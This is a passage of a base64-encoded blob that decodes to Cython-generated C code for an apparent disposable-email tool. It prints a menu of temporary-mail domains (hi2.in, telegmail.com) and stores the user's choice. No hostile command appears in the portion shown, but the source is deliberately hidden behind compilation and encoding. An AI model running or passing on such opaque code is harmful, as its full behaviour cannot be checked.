5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMyA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQV8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdF8yID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0F2YWlsYWJsZV9Eb21haW5zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMzAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfdF8yfTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0""X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzMCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDMxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xX2hpMl9pbik7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDMxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X3RfNH07CiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzEsIF9fcHl4""X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICBfX3B5eF90XzQgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzMgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMl90ZWxlZ21haWxfY29tKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF8zfTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzMiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogIAogIF9fcHl4X3RfNCA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMyA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJS""KDAsIDMzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zX0JvdGhfZG9tYWlucyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDMzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfMn07CiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzMsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzQgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTsKICBfX3B5eF90XzUgPSBfX3B5eF9idWlsdGluX2lucHV0OyAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0FfMik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMzQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogIF9fcHl4X3RfOCA9IF9f""UHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9DaG9vc2VfZG9tYWluXzFfMl8zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMzQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfdF84fTsKICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICB9CiAgX19weXhfdF8zID0gX19weXhfdF8yOwogIF9fUHl4X0lOQ1JFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNiA9IDA7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMywgTlVMTH07CiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaXAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICB9CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb21haW5fY2hvaWNlLCBfX3B5eF90XzcpIDwgMCkgX19QWVhfRVJSKDAsIDM0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgCiAgX19weXhfdF83ID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFs""LT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmRoZG9tYWluLCBfX3B5eF90XzcpIDwgMCkgX19QWVhfRVJSKDAsIDM1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb21haW5fY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fcHl4X3RfMTAgPSAoX19QeXhfUHlVbmljb2RlX0VxdWFscyhfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzEwIDwgMCkpKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogIGlmIChfX3B5eF90XzEwKSB7CgogICAgCiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAzNywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5TGlzdF9QYWNrKDEsIF9fcHl4X3RfNyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JkaGRvbWFpbiwgX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCAzNywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAKICAgIF9fcHl4X3RfNyA9IE5VTEw7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgICBfX3B5eF90XzMgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MMV9l""cnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0gpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzOCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzOCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19weXhfdF8xMVswXSA9IF9fcHl4X3RfODsKICAgIF9fcHl4X3RfMTFbMV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1NlbGVjdGVkX2hpMl9pbjsKICAgIF9fcHl4X3RfMTFbMl0gPSBfX3B5eF90XzQ7CiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzExLCAzLCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpICsgMTcgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF84KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzQpKTsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fcHl4X3RfNiA9IDE7CiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIF9fcHl4X3RfNX07CiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDM4LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICB9CiAgICBfX1B5eF9ERUNS""RUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgICAKICAgIGdvdG8gX19weXhfTDI7CiAgfQoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RvbWFpbl9jaG9pY2UpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAzOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF8xMCA9IChfX1B5eF9QeVVuaWNvZGVfRXF1YWxzKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8yLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTAgPCAwKSkpIF9fUFlYX0VSUigwLCAzOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgaWYgKF9fcHl4X3RfMTApIHsKCiAgICAKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQyk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDQwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogICAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfdF8yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDAsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmRoZG9tYWluLCBfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDQwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgIAogICAgX19weXhfdF8yID0gTlVMTDsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICAgIF9fcHl4X3RfNSA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9EKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9f""UHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDQxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX3B5eF90XzExWzBdID0gX19weXhfdF80OwogICAgX19weXhfdF8xMVsxXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfU2VsZWN0ZWRfdGVsZWdtYWlsX2NvbTsKICAgIF9fcHl4X3RfMTFbMl0gPSBfX3B5eF90Xzg7CiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzExLCAzLCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgMjQgKyBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzgpLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9N